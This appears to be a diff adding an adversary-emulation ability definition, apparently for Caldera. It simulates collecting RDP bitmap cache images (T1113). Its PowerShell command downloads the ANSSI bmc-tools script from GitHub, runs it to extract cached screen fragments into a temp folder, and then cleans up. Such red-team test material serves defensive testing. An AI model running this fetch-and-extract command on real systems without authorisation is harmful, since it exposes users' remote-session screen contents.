@@ -1,0 +1,28 @@
+---
+- id: 75754c502e0b5c7dc757bd1057cab46e
+  name: RDP Bitmap Cache Extraction via bmc-tools
+  description: 'Simulates an attacker extracting the RDP bitmap cache using the ANSSI
+    "bmc-tools.py" script.
+
+    This test requires valid RDP bitmap cache files to exist on the system (usually
+    created after an outgoing RDP connection is made).
+
+    '
+  tactic: collection
+  technique:
+    attack_id: T1113
+    name: Screen Capture
+  platforms:
+    windows:
+      psh:
+        command: $url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py';
+          $toolsDir = "$env:TEMP\bmc-tools.py"; New-Item -ItemType Directory -Path
+          $env:TEMP\rdp_screens -Force | Out-Null; & curl.exe -L $url --output $toolsDir;
+          if (Test-Path $toolsDir) { python $toolsDir -s "$env:LOCALAPPDATA\Microsoft\Terminal
+          Server Client\Cache" -d $env:TEMP\rdp_screens -b }
+        payloads: []
+        cleanup: Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue;
+          Remove-Item $env:TEMP\rdp_screens -Recurse -Force -ErrorAction SilentlyContinue
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
